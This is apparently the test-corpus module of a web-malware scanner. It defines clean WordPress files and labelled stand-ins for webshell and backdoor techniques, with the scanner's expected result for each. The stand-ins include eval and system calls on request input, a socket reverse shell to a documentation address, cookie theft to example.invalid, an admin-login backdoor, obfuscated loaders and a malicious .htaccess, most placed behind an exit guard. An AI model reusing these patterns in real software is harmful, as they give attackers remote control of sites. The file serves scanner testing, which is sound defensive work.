/*!
 * JaySift by JayHackPro
 * Find and remove web malware, webshells, and backdoors.
 * Released under JayHackPro. Designed by Jayden Yoon ZK.
 * MIT License: use it freely, and keep this notice. The brand stays behind the code.
 * https://github.com/JayHackPro/JaySift
 */

/**
 * A corpus of harmless files for measuring the scanner.
 *
 * Nothing here is malware. Every "bad" file is a stand-in: it has the shape a
 * scanner should notice and nothing that can do harm. PHP stand-ins stop at
 * their second line, addresses use example.invalid or the documentation range
 * 192.0.2.0/24, and payloads decode to a line that prints a word. The files
 * are written to a temporary folder when a measurement runs and never live in
 * the repository.
 *
 * Three groups:
 *   clean      ordinary site files, among them every shape that has been
 *              wrongly flagged before. None of these should be called a threat.
 *   textbook   one known technique per file, written the plain way.
 *   disguised  the same ideas with one light disguise each.
 *
 * `expect` says what the scanner should do with the file today:
 *   "quiet"    no finding at all
 *   "review"   at most a medium or low finding, never high or critical
 *   "flag"     any finding
 *   "missed"   a known gap: the scanner does not catch this yet
 *   "included" caught only when skipped folders and large files are scanned
 *
 * `set` names the batch a file was added in. Files without one are the base
 * set. The counts are kept per set as well as in total, so adding files
 * never moves a figure that was reported before.
 */

import { promises as fs } from "node:fs";
import path from "node:path";

const GUARD =
  "/* JaySift corpus stand-in. Harmless: the next line ends the script, so nothing below it ever runs. */\n" +
  "if (!defined('JAYSIFT_STAND_IN')) { exit; }\n";

/** A PHP stand-in that stops before its payload. */
const php = (...lines) => "<?php\n" + GUARD + lines.join("\n") + "\n";
const text = (...lines) => lines.join("\n") + "\n";

// "echo 'hello';" in base64. The only thing any encoded payload here says.
const HELLO = "ZWNobyAnaGVsbG8nOw==";

// A real 1x1 PNG, so the image files are genuine binary images.
const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64"
);

// 320 base64 characters of a harmless embedded asset, for the bundle that decodes one.
const ASSET = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5".repeat(7).slice(0, 320);

const P = "wp-content/plugins/acme-forms";
const T = "wp-content/themes/acme";
const U = "wp-content/uploads";

export const CORPUS = [
  // ------------------------------------------------------------------ clean
  {
    path: `${P}/readme.txt`,
    group: "clean",
    technique: "plugin readme with a PHP usage example",
    expect: "quiet",
    content: text(
      "=== Acme Forms ===",
      "Contributors: acme",
      "Tags: forms, contact",
      "Requires at least: 6.0",
      "Stable tag: 2.3.1",
      "",
      "A small contact form plugin.",
      "",
      "== Installation ==",
      "",
      "1. Upload the plugin folder to `/wp-content/plugins/`.",
      "2. Activate it on the Plugins screen.",
      "3. Place `<?php echo do_shortcode( '[acme_form id=\"12\"]' ); ?>` in a template,",
      "   or call the helper:",
      "",
      "<?php",
      "if ( function_exists( 'acme_form' ) ) {",
      "    acme_form( 12 );",
      "}",
      "?>",
      "",
      "== Changelog ==",
      "",
      "= 2.3.1 =",
      "* Fix: the form now keeps its values after a failed submit."
    )
  },
  {
    path: `${P}/includes/class-notes.php`,
    group: "clean",
    technique: "code comment that mentions eval(base64_decode(",
    expect: "quiet",
    content: text(
      "<?php",
      "/**",
      " * Notes for reviewers.",
      " *",
      " * Packed loaders usually look like eval(base64_decode( ... )) or",
      " * system($_GET['cmd']). This class never does either.",
      " */",
      "class Acme_Notes {",
      "    // A loader such as eval(gzinflate(base64_decode($x))) would be rejected in review.",
      "    public function label() {",
      "        return 'notes'; # not create_function( or assert($_POST['x'])",
      "    }",
      "}"
    )
  },
  {
    path: `${U}/index.php`,
    group: "clean",
    technique: "index.php holding only Silence is golden, in uploads",
    expect: "quiet",
    content: text("<?php", "// Silence is golden.")
  },
  {
    path: `${T}/index.php`,
    group: "clean",
    technique: "index.php holding only Silence is golden, in a theme",
    expect: "quiet",
    content: text("<?php", "// Silence is golden.")
  },
  {
    path: `${T}/header.php`,
    group: "clean",
    technique: "navigation with a submenu hidden until hover",
    expect: "review",
    content: text(
      "<?php /* Theme header. */ ?>",
      "<nav class=\"site-nav\">",
      "  <a href=\"/\">Home</a>",
      "  <div class=\"submenu\" style=\"display:none\"><a href=\"/services/audit\">Audit</a> <a href=\"/services/cleanup\">Clean-up</a> <a href=\"/services/training\">Training</a></div>",
      "</nav>"
    )
  },
  {
    path: `${T}/assets/player.min.js`,
    group: "clean",
    technique: "minified script that decodes an embedded asset with atob",
    expect: "review",
    content: text(
      `(function(){var a="${ASSET}";var b=atob(a);var i=new Image();i.alt=b.length;i.src="data:image/png;base64,"+a;document.body.appendChild(i)})();`
    )
  },
  {
    path: `${P}/includes/upload.php`,
    group: "clean",
    technique: "upload handler that checks type, size and destination",
    expect: "review",
    content: text(
      "<?php",
      "function acme_handle_upload() {",
      "    check_admin_referer( 'acme_upload' );",
      "    $allowed = array( 'jpg' => 'image/jpeg', 'png' => 'image/png' );",
      "    $check   = wp_check_filetype( $_FILES['file']['name'], $allowed );",
      "    if ( ! $check['ext'] || $_FILES['file']['size'] > 2 * MB_IN_BYTES ) {",
      "        wp_die( 'That file type is not allowed.' );",
      "    }",
      "    $dest = trailingslashit( wp_upload_dir()['path'] ) . wp_unique_filename( wp_upload_dir()['path'], sanitize_file_name( $_FILES['file']['name'] ) );",
      "    move_uploaded_file( $_FILES['file']['tmp_name'], $dest );",
      "}"
    )
  },
  {
    path: "wp-content/plugins/acme-speed/inc/Engine/Media/Lazyload.php",
    group: "clean",
    technique: "plugin source file in a folder named Media",
    expect: "quiet",
    content: text(
      "<?php",
      "namespace Acme\\Speed\\Engine\\Media;",
      "",
      "class Lazyload {",
      "    public function add_attribute( string $html ): string {",
      "        return str_replace( '<img ', '<img loading=\"lazy\" ', $html );",
      "    }",
      "}"
    )
  },
  {
    path: ".htaccess",
    group: "clean",
    technique: "WordPress rewrite rules, a host PHP handler and a firewall prepend",
    expect: "quiet",
    content: text(
      "# BEGIN WordPress",
      "<IfModule mod_rewrite.c>",
      "RewriteEngine On",
      "RewriteBase /",
      "RewriteRule ^index\\.php$ - [L]",
      "RewriteCond %{REQUEST_FILENAME} !-f",
      "RewriteCond %{REQUEST_FILENAME} !-d",
      "RewriteRule . /index.php [L]",
      "</IfModule>",
      "# END WordPress",
      "",
      "# php -- BEGIN cPanel-generated handler, do not edit",
      "<IfModule mime_module>",
      "  AddHandler application/x-httpd-ea-php81 .php .php8 .phtml",
      "</IfModule>",
      "# php -- END cPanel-generated handler, do not edit",
      "",
      "# Wordfence WAF",
      "<IfModule mod_php.c>",
      "  php_value auto_prepend_file '/home/acme/public_html/wordfence-waf.php'",
      "</IfModule>",
      "# END Wordfence WAF",
      "",
      "# An old experiment, left commented out:",
      "# AddType application/x-httpd-php .jpg"
    )
  },
  {
    path: "shop/.htaccess",
    group: "clean",
    technique: "https redirect and hotlink protection that lets search engines through",
    expect: "quiet",
    content: text(
      "RewriteEngine On",
      "RewriteCond %{HTTPS} off",
      "RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]",
      "",
      "RewriteCond %{HTTP_REFERER} !^$",
      "RewriteCond %{HTTP_REFERER} !^https?://(www\\.)?example\\.com [NC]",
      "RewriteCond %{HTTP_REFERER} !google\\. [NC]",
      "RewriteCond %{HTTP_REFERER} !bing\\. [NC]",
      "RewriteRule \\.(jpe?g|png|gif)$ https://example.com/no-hotlink.png [R,L]",
      "",
      "<FilesMatch \"\\.(jpe?g|png|gif)$\">",
      "  Header set Cache-Control \"max-age=31536000, public\"",
      "</FilesMatch>"
    )
  },
  {
    path: ".user.ini",
    group: "clean",
    technique: "firewall prepend in .user.ini",
    expect: "quiet",
    content: text(
      "; Wordfence WAF",
      "auto_prepend_file = '/home/acme/public_html/wordfence-waf.php'",
      "; END Wordfence WAF",
      "upload_max_filesize = 32M"
    )
  },
  {
    path: "includes/form.inc",
    group: "clean",
    technique: "ordinary PHP include file with an .inc ending",
    expect: "quiet",
    content: text(
      "<?php",
      "/**",
      " * Form helpers.",
      " */",
      "function acme_form_validate( array $values ) {",
      "    $errors = array();",
      "    if ( empty( $values['email'] ) || ! filter_var( $values['email'], FILTER_VALIDATE_EMAIL ) ) {",
      "        $errors['email'] = 'Enter a valid email address.';",
      "    }",
      "    return $errors;",
      "}"
    )
  },
  {
    path: `${P}/includes/class-db.php`,
    group: "clean",
    technique: "SQL in backticks, a heredoc, doc comments with backticks, ordinary includes",
    expect: "quiet",
    content: text(
      "<?php",
      "/**",
      " * Reads rows. Values come from `$_POST` and `$_GET` and are validated first.",
      " * Run `wp acme sync` to refresh.",
      " */",
      "require_once __DIR__ . '/class-notes.php';",
      "include ACME_FORMS_DIR . 'includes/form-fields.php';",
      "",
      "class Acme_Db {",
      "    public function rows( $limit ) {",
      "        global $wpdb;",
      "        $limit = absint( $limit );",
      "        $sql   = \"SELECT `id`, `email` FROM `{$wpdb->prefix}acme_entries` ORDER BY `id` DESC LIMIT {$limit}\";",
      "        $help  = <<<TXT",
      "See https://example.com/docs // not a comment, and `not a command` either.",
      "/* still text */ and # still text",
      "TXT;",
      "        $url = 'https://example.com/a//b';",
      "        return array( $wpdb->get_results( $sql ), $help, $url );",
      "    }",
      "}"
    )
  },
  {
    path: `${P}/includes/class-thumbs.php`,
    group: "clean",
    technique: "base64 decoded into a variable as data, and a command built with escaping",
    expect: "quiet",
    content: text(
      "<?php",
      "class Acme_Thumbs {",
      "    public function from_data_uri( $row ) {",
      "        $data  = base64_decode( $row->image_b64 );",
      "        $image = imagecreatefromstring( $data );",
      "        return $image;",
      "    }",
      "",
      "    public function convert() {",
      "        $name = sanitize_file_name( $_POST['file'] );",
      "        $src  = trailingslashit( wp_upload_dir()['path'] ) . $name;",
      "        $cmd  = 'convert ' . escapeshellarg( $src ) . ' -resize 300x300 ' . escapeshellarg( $src . '.thumb.jpg' );",
      "        exec( $cmd, $out, $code );",
      "        return 0 === $code;",
      "    }",
      "}"
    )
  },
  {
    path: "wp-config.php",
    group: "clean",
    technique: "site configuration",
    expect: "quiet",
    content: text(
      "<?php",
      "define( 'DB_NAME', 'acme' );",
      "define( 'DB_USER', 'acme' );",
      "define( 'DB_PASSWORD', 'not-a-real-password' );",
      "define( 'DB_HOST', 'localhost' );",
      "$table_prefix = 'wp_';",
      "if ( ! defined( 'ABSPATH' ) ) {",
      "    define( 'ABSPATH', __DIR__ . '/' );",
      "}",
      "require_once ABSPATH . 'wp-settings.php';"
    )
  },
  {
    path: "wp-settings.php",
    group: "clean",
    technique: "core bootstrap file",
    expect: "quiet",
    content: text(
      "<?php",
      "define( 'WPINC', 'wp-includes' );",
      "require ABSPATH . WPINC . '/version.php';"
    )
  },
  {
    path: "wp-includes/version.php",
    group: "clean",
    technique: "core version file",
    expect: "quiet",
    content: text("<?php", "$wp_version = '6.8.1';", "$wp_db_version = 60421;")
  },
  {
    path: `${T}/functions.php`,
    group: "clean",
    technique: "theme functions",
    expect: "quiet",
    content: text(
      "<?php",
      "add_action( 'wp_enqueue_scripts', function () {",
      "    wp_enqueue_style( 'acme', get_stylesheet_uri(), array(), '1.4.0' );",
      "    wp_enqueue_script( 'acme-app', get_template_directory_uri() . '/assets/app.js', array(), '1.4.0', true );",
      "} );",
      "add_theme_support( 'title-tag' );"
    )
  },
  {
    path: `${P}/acme-forms.php`,
    group: "clean",
    technique: "plugin main file reading request values safely",
    expect: "quiet",
    content: text(
      "<?php",
      "/**",
      " * Plugin Name: Acme Forms",
      " * Version: 2.3.1",
      " */",
      "defined( 'ABSPATH' ) || exit;",
      "define( 'ACME_FORMS_DIR', plugin_dir_path( __FILE__ ) );",
      "",
      "add_action( 'admin_init', function () {",
      "    $tab  = isset( $_GET['tab'] ) ? sanitize_key( $_GET['tab'] ) : 'general';",
      "    $page = isset( $_GET['paged'] ) ? absint( $_GET['paged'] ) : 1;",
      "    $file = ACME_FORMS_DIR . 'includes/tab-' . $tab . '.php';",
      "    if ( in_array( $tab, array( 'general', 'entries' ), true ) && is_readable( $file ) ) {",
      "        include $file;",
      "    }",
      "    update_option( 'acme_last_page', $page );",
      "} );"
    )
  },
  {
    path: `${T}/assets/app.js`,
    group: "clean",
    technique: "front-end script with template strings",
    expect: "quiet",
    content: text(
      "const menu = document.querySelector('.site-nav');",
      "const label = (name) => `Open ${name} menu`; // `not` a command",
      "menu.addEventListener('mouseenter', () => {",
      "  const sub = menu.querySelector('.submenu');",
      "  sub.style.display = 'block';",
      "  sub.setAttribute('aria-label', label('services'));",
      "});"
    )
  },
  {
    path: `${T}/style.css`,
    group: "clean",
    technique: "stylesheet",
    expect: "quiet",
    content: text(
      "/* Theme Name: Acme */",
      ".site-nav { display: flex; gap: 1rem; }",
      ".submenu { position: absolute; left: 0; top: 100%; }"
    )
  },
  {
    path: "about.html",
    group: "clean",
    technique: "page with a visible video embed and a script from a public CDN",
    expect: "quiet",
    content: text(
      "<!doctype html>",
      "<html lang=\"en\"><head><title>About</title>",
      "<script src=\"https://cdn.jsdelivr.net/npm/htmx.org@2.0.4/dist/htmx.min.js\"></script>",
      "</head><body>",
      "<h1>About us</h1>",
      "<iframe src=\"https://www.youtube-nocookie.com/embed/abc123\" width=\"560\" height=\"315\" title=\"Our story\"></iframe>",
      "</body></html>"
    )
  },
  {
    path: `${U}/2026/11/photo.png`,
    group: "clean",
    technique: "a real image in uploads",
    expect: "quiet",
    content: PNG
  },
  {
    path: `${P}/docs/security.md`,
    group: "clean",
    technique: "documentation showing what not to write",
    expect: "quiet",
    content: text(
      "# Security notes",
      "",
      "Never run request input. This is the mistake to avoid:",
      "",
      "```php",
      "<?php",
      "eval($_GET['code']); // do not do this",
      "```",
      "",
      "Use a fixed list of actions instead."
    )
  },

  // --------------------------------------------------------------- textbook
  {
    path: `${P}/includes/cache-loader.php`,
    group: "textbook",
    technique: "eval of a base64-decoded payload",
    expect: "flag",
    content: php(`eval(base64_decode('${HELLO}'));`)
  },
  {
    path: `${U}/2026/11/invoice.pdf.php`,
    group: "textbook",
    technique: "script with a harmless-looking second extension, in uploads",
    expect: "flag",
    content: php("echo 'hello';")
  },
  {
    path: `${U}/2026/11/thumb.php`,
    group: "textbook",
    technique: "eval of raw request input, planted in uploads",
    expect: "flag",
    content: php("eval($_POST['c']);")
  },
  {
    path: "wp-includes/class-wp-locale-cache.php",
    group: "textbook",
    technique: "preg_replace with the /e modifier",
    expect: "flag",
    content: php("preg_replace('/.*/e', $_POST['c'], '');")
  },
  {
    path: `${T}/inc/widgets.php`,
    group: "textbook",
    technique: "create_function built from request input",
    expect: "flag",
    content: php("$f = create_function('', $_GET['c']);", "$f();")
  },
  {
    path: `${P}/includes/ajax.php`,
    group: "textbook",
    technique: "request picks the function and its argument",
    expect: "flag",
    content: php("$_GET['f']($_POST['a']);")
  },
  {
    path: "wp-admin/includes/class-tools.php",
    group: "textbook",
    technique: "system() on request input",
    expect: "flag",
    content: php("system($_GET['cmd']);")
  },
  {
    path: `${P}/includes/hooks.php`,
    group: "textbook",
    technique: "call_user_func named by the request",
    expect: "flag",
    content: php("call_user_func($_REQUEST['f'], $_REQUEST['a']);")
  },
  {
    path: `${T}/inc/options.php`,
    group: "textbook",
    technique: "extract of request input",
    expect: "flag",
    content: php("extract($_REQUEST);", "echo isset($title) ? 'set' : 'unset';")
  },
  {
    path: "wp-includes/class-wp-socket.php",
    group: "textbook",
    technique: "reverse shell over a socket",
    expect: "flag",
    content: php("$s = fsockopen('192.0.2.1', 4444);", "exec('/bin/sh -i <&3 >&3 2>&3');")
  },
  {
    path: `${P}/includes/strings.php`,
    group: "textbook",
    technique: "name assembled from chr() calls",
    expect: "flag",
    content: php("$n = chr(118).chr(97).chr(114).chr(95).chr(100).chr(117).chr(109).chr(112);", "$n('hello');")
  },
  {
    path: `${T}/inc/compat.php`,
    group: "textbook",
    technique: "function name spelled in hex escapes",
    expect: "flag",
    content: php(String.raw`$f = "\x65\x76\x61\x6c";`, "echo strlen($f);")
  },
  {
    path: `${P}/includes/registry.php`,
    group: "textbook",
    technique: "call through $GLOBALS",
    expect: "flag",
    content: php("$GLOBALS['a'] = 'printf';", "$GLOBALS['a']('hello');")
  },
  {
    path: "wp-includes/class-wp-remote-loader.php",
    group: "textbook",
    technique: "remote payload fetched and run",
    expect: "flag",
    content: php("eval(file_get_contents('http://example.invalid/p.txt'));")
  },
  {
    path: `${U}/up.php`,
    group: "textbook",
    technique: "upload handler with no checks at all",
    expect: "flag",
    content: php("move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);")
  },
  {
    path: `${T}/inc/c.php`,
    group: "textbook",
    technique: "c99 shell fingerprint",
    expect: "flag",
    content: php("$c99sh_version = '1.0';", "echo 'c99shell';")
  },
  {
    path: `${T}/inc/r.php`,
    group: "textbook",
    technique: "r57 shell fingerprint",
    expect: "flag",
    content: php("echo 'r57shell';")
  },
  {
    path: `${P}/includes/w.php`,
    group: "textbook",
    technique: "WSO shell fingerprint",
    expect: "flag",
    content: php("define('WSO_VERSION', '2.5');")
  },
  {
    path: `${P}/includes/b.php`,
    group: "textbook",
    technique: "b374k shell fingerprint",
    expect: "flag",
    content: php("$b374k = 1;")
  },
  {
    path: "wp-admin/fm.php",
    group: "textbook",
    technique: "FilesMan action string",
    expect: "flag",
    content: php("$default_action = 'FilesMan';")
  },
  {
    path: "hacked.html",
    group: "textbook",
    technique: "defacement page banner",
    expect: "flag",
    content: text("<!doctype html>", "<title>Hacked By Example Crew</title>", "<h1>Hacked By Example Crew</h1>")
  },
  {
    path: `${P}/includes/gate.php`,
    group: "textbook",
    technique: "hardcoded password hash gate",
    expect: "flag",
    content: php("if (md5($_POST['p']) === '5f4dcc3b5aa765d61d8327deb882cf99') { echo 'in'; }")
  },
  {
    path: `${T}/assets/track.js`,
    group: "textbook",
    technique: "document.write of an unescaped string",
    expect: "flag",
    content: text("document.write(unescape('%3Cb%3Ehello%3C/b%3E'));")
  },
  {
    path: `${T}/assets/loader.js`,
    group: "textbook",
    technique: "eval of an atob-decoded string",
    expect: "flag",
    content: text("eval(atob('Y29uc29sZS5sb2coJ2hlbGxvJyk='));")
  },
  {
    path: "promo.html",
    group: "textbook",
    technique: "zero-size hidden iframe",
    expect: "flag",
    content: text(
      "<!doctype html>",
      "<p>Promo</p>",
      "<iframe src=\"https://example.invalid/x\" width=\"0\" height=\"0\" style=\"display:none\"></iframe>"
    )
  },
  {
    path: `${T}/assets/session.js`,
    group: "textbook",
    technique: "cookie sent to another address",
    expect: "flag",
    content: text("new Image().src = 'https://example.invalid/c?d=' + document.cookie;")
  },
  {
    path: "landing.html",
    group: "textbook",
    technique: "browser miner script tag",
    expect: "flag",
    content: text("<!doctype html>", "<script src=\"https://example.invalid/coinhive.min.js\"></script>")
  },
  {
    path: `${T}/footer.php`,
    group: "textbook",
    technique: "hidden block of spam links",
    expect: "flag",
    content: text(
      "<?php /* Theme footer. */ ?>",
      "<div style=\"position:absolute; left:-9999px\"><a href=\"https://example.invalid/a\">cheap viagra</a> <a href=\"https://example.invalid/b\">online casino</a></div>",
      "<span style=\"display:none\">buy cialis online</span>"
    )
  },
  {
    path: `${U}/2026/11/banner.png`,
    group: "textbook",
    technique: "real image with PHP appended",
    expect: "flag",
    content: Buffer.concat([PNG, Buffer.from("\n<?php /* stand-in */ exit; ?>\n")])
  },

  // -------------------------------------------------------------- disguised
  {
    path: `${P}/includes/class-loader.php`,
    group: "disguised",
    technique: "payload decoded into a variable, then eval($c)",
    expect: "flag",
    content: php(`$c = base64_decode('${HELLO}');`, "eval($c);")
  },
  {
    path: `${P}/includes/class-runner.php`,
    group: "disguised",
    technique: "function name built by joining strings",
    expect: "flag",
    content: php("$f = 'sys' . 'tem';", "$f($_GET['c']);")
  },
  {
    path: "wp-admin/includes/class-shell-helper.php",
    group: "disguised",
    technique: "request value copied to a variable, then system($c)",
    expect: "flag",
    content: php("$c = $_GET['c'];", "system($c);")
  },
  {
    path: `${T}/inc/tick.php`,
    group: "disguised",
    technique: "backtick execution of request input",
    expect: "flag",
    content: php("$out = `{$_REQUEST['c']}`;", "echo $out;")
  },
  {
    path: `${T}/page-loader.php`,
    group: "disguised",
    technique: "include of request input",
    expect: "flag",
    content: php("include($_GET['page']);")
  },
  {
    path: `${U}/.htaccess`,
    group: "disguised",
    technique: "malicious .htaccess: search-visitor redirect, auto_prepend_file, PHP handler for .jpg",
    expect: "flag",
    content: text(
      "RewriteEngine On",
      "RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo)\\. [NC]",
      "RewriteRule ^(.*)$ http://example.invalid/in.php?u=$1 [R=302,L]",
      "php_value auto_prepend_file \"/home/acme/public_html/wp-content/uploads/2026/11/photo.jpg\"",
      "AddType application/x-httpd-php .jpg"
    )
  },
  {
    path: `${T}/footer-widgets.php`,
    group: "disguised",
    technique: "plain external script tag added to a template",
    expect: "missed",
    content: text(
      "<?php /* Footer widgets. */ ?>",
      "<div class=\"widgets\"></div>",
      "<script src=\"https://example.invalid/stat.js\"></script>"
    )
  },
  {
    path: `${P}/includes/db.inc`,
    group: "disguised",
    technique: "shell saved with an .inc ending",
    expect: "flag",
    content: php("eval($_POST['x']);")
  },
  {
    path: `${P}/includes/class-cache.php`,
    group: "disguised",
    technique: "comment between the function name and its bracket",
    expect: "flag",
    content: php(`eval/**/(base64_decode/**/('${HELLO}'));`)
  },
  {
    path: "wp-includes/class-wp-session-helper.php",
    group: "disguised",
    technique: "WordPress admin-login backdoor",
    expect: "missed",
    content: php(
      "if (isset($_GET['k']) && $_GET['k'] === 'stand-in-key') {",
      "    wp_set_auth_cookie(1);",
      "    wp_redirect(admin_url());",
      "}"
    )
  },
  {
    path: `${P}/includes/writer.php`,
    group: "disguised",
    technique: "request input written straight to a file",
    expect: "missed",
    content: php("file_put_contents($_POST['f'], $_POST['d']);")
  },
  {
    path: "tools/upload.asp",
    group: "disguised",
    technique: "classic ASP one-liner",
    expect: "missed",
    content: text("<%", "Response.End ' stand-in: stops here", "eval request(\"c\")", "%>")
  },
  {
    path: `${T}/assets/stats.js`,
    group: "disguised",
    technique: "script loader written as an array of hex strings",
    expect: "missed",
    content: text(
      String.raw`var _0x4c1a=["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74","\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x69\x6e\x76\x61\x6c\x69\x64\x2f\x78\x2e\x6a\x73","\x68\x65\x61\x64","\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64"];`,
      "var s=document[_0x4c1a[0]](_0x4c1a[1]);s[_0x4c1a[2]]=_0x4c1a[3];document[_0x4c1a[4]][_0x4c1a[5]](s);"
    )
  },
  {
    path: `${P}/includes/filter.php`,
    group: "disguised",
    technique: "system passed by name as a callback",
    expect: "flag",
    content: php("array_filter(array($_GET['c']), 'system');")
  },
  {
    path: `${P}/vendor/autoload_real.php`,
    group: "disguised",
    technique: "shell in a folder named vendor, which is skipped by default",
    expect: "included",
    content: php("eval($_POST['x']);")
  },
  {
    path: "wp-includes/class-wp-big.php",
    group: "disguised",
    technique: "shell padded past the 5 MB size limit",
    expect: "included",
    content: php("eval($_POST['x']);", "/*", "A".repeat(5 * 1024 * 1024 + 4096), "*/")
  },

  // ----- set "calls-by-name": a command or code function called through a
  // string that holds its name. Added with the checks in src/calls.js and
  // counted apart from the files above, so earlier figures stay comparable.
  {
    path: `${P}/includes/class-joiner.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name joined with .= and called on a request value held in a variable",
    expect: "flag",
    content: php("$n = 'pass';", "$n .= 'thru';", "$cmd = $_POST['cmd'];", "$n($cmd);")
  },
  {
    path: `${P}/includes/class-compat.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name joined with implode",
    expect: "flag",
    content: php("$f = implode('', array('sh', 'ell', '_ex', 'ec'));", "echo $f($_REQUEST['q']);")
  },
  {
    path: `${T}/inc/glyphs.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name built from chr() pieces",
    expect: "flag",
    content: php("$f = chr(115) . chr(121) . chr(115) . 'tem';", "$f($_COOKIE['k']);")
  },
  {
    path: `${P}/includes/class-bridge.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "joined name passed as a callback",
    expect: "flag",
    content: php("call_user_func('ass' . 'ert', $_POST['x']);")
  },
  {
    path: `${P}/includes/sorter.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "system as a sort callback on request values held in a variable",
    expect: "flag",
    content: php("$a = array($_POST['a'], $_POST['b']);", "usort($a, 'system');")
  },
  {
    path: "wp-includes/class-wp-shutdown.php",
    group: "disguised",
    set: "calls-by-name",
    technique: "system registered as a shutdown function with a request value",
    expect: "flag",
    content: php("register_shutdown_function('system', $_GET['c']);")
  },
  {
    path: `${P}/includes/validate.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "assert as a filter_var callback",
    expect: "flag",
    content: php("filter_var($_REQUEST['c'], FILTER_CALLBACK, array('options' => 'assert'));")
  },
  {
    path: `${T}/inc/inline.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "joined name called straight from brackets",
    expect: "flag",
    content: php("('sys' . 'tem')($_GET['c']);")
  },
  {
    path: `${P}/includes/class-spaced.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "joined name with comments between the pieces and before the bracket",
    expect: "flag",
    content: php("$f = 'sys' /* a */ . 'tem';", "$f /* b */ ($_GET['c']);")
  },
  {
    path: `${P}/includes/class-named.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name held whole in a variable",
    expect: "flag",
    content: php("$f = 'system';", "$f($_GET['c']);")
  },
  {
    path: `${P}/includes/class-escaped.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name written with a hex escape",
    expect: "flag",
    content: php('$f = "\\x73ystem";', "$f($_GET['c']);")
  },
  {
    path: `${P}/includes/class-decoy.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "joined name with a harmless reassignment inside a branch",
    expect: "flag",
    content: php("$f = 'sys' . 'tem';", "if (isset($_GET['plain'])) { $f = 'trim'; }", "echo $f($_GET['c']);")
  },
  {
    path: `${P}/includes/class-closure.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "joined name carried into a closure with use",
    expect: "flag",
    content: php("$f = 'sys' . 'tem';", "$run = function () use ($f) { return $f($_POST['c']); };", "$run();")
  },
  {
    path: `${P}/includes/class-reversed.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name reversed with strrev",
    expect: "missed",
    content: php("$f = strrev('metsys');", "$f($_GET['c']);")
  },
  {
    path: `${P}/includes/class-pieces.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "function name joined from array elements",
    expect: "missed",
    content: php("$p = array('sys', 'tem');", "$f = $p[0] . $p[1];", "$f($_GET['c']);")
  },
  {
    path: `${T}/inc/buffer.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "system as an output buffer callback",
    expect: "missed",
    content: php("ob_start('system');", "echo $_GET['c'];", "ob_end_flush();")
  },
  {
    path: `${P}/includes/class-fixed.php`,
    group: "disguised",
    set: "calls-by-name",
    technique: "joined name called on a fixed value, with no request input",
    expect: "missed",
    content: php("$f = 'sys' . 'tem';", "$f('uptime');")
  },
  {
    path: `${P}/includes/class-request-filters.php`,
    group: "clean",
    set: "calls-by-name",
    technique: "harmless callbacks called on request input",
    expect: "quiet",
    content: text(
      "<?php",
      "// Tidy what the form sends before it is used.",
      "$tags = array_map('trim', (array) $_POST['tags']);",
      "$ids = array_filter((array) $_GET['ids'], 'is_numeric');",
      "usort($tags, 'strcasecmp');",
      "$title = call_user_func('sanitize_text_field', $_POST['title']);",
      "$rows = array_map(array($table, 'exec'), (array) $_POST['rows']);",
      "register_shutdown_function('acme_forms_flush', $_GET['form']);"
    )
  },
  {
    path: `${P}/includes/class-dispatcher.php`,
    group: "clean",
    set: "calls-by-name",
    technique: "handler and helper names joined from pieces and called",
    expect: "quiet",
    content: text(
      "<?php",
      "$action = isset($_GET['action']) ? $_GET['action'] : 'list';",
      "$allowed = array('list', 'view', 'export');",
      "if (in_array($action, $allowed, true)) {",
      "    $handler = 'acme_forms_handle_' . $action;",
      "    if (function_exists($handler)) {",
      "        $handler($_GET);",
      "    }",
      "}",
      "$fn = 'str' . 'toupper';",
      "echo esc_html($fn($_GET['label']));",
      "$method = 'get_' . 'title';",
      "echo esc_html($form->$method());"
    )
  },
  {
    path: `${P}/includes/class-help.php`,
    group: "clean",
    set: "calls-by-name",
    technique: "calls by name quoted in comments, strings and a nowdoc",
    expect: "quiet",
    content: text(
      "<?php",
      "/**",
      " * What a scanner looks for. None of this is code:",
      " *   $f = 'sys' . 'tem'; $f($_GET['c']);",
      " *   array_filter(array($_GET['c']), 'system');",
      " */",
      "// call_user_func('ass' . 'ert', $_POST['x']);",
      "$help = \"A backdoor may write \\$f = 'sys' . 'tem'; and then \\$f(\\$_GET['c']);\";",
      "$more = 'or array_map(\"system\", array($_GET[\"c\"]));';",
      "$sample = <<<'TXT'",
      "$f = 'sys' . 'tem';",
      "$f($_GET['c']);",
      "usort($a, 'system');",
      "TXT;",
      "echo esc_html($help . $more . $sample . $_GET['topic']);"
    )
  },
  {
    path: `${P}/includes/class-environment.php`,
    group: "clean",
    set: "calls-by-name",
    technique: "shell function named in pieces for a capability check and never called",
    expect: "quiet",
    content: text(
      "<?php",
      "function acme_forms_can_shell() {",
      "    $fn = 'shell' . '_exec';",
      "    return function_exists($fn) && is_callable($fn);",
      "}",
      "function acme_forms_apply($fn) {",
      "    return $fn($_GET['label']);",
      "}",
      "echo esc_html(acme_forms_apply('strtoupper'));",
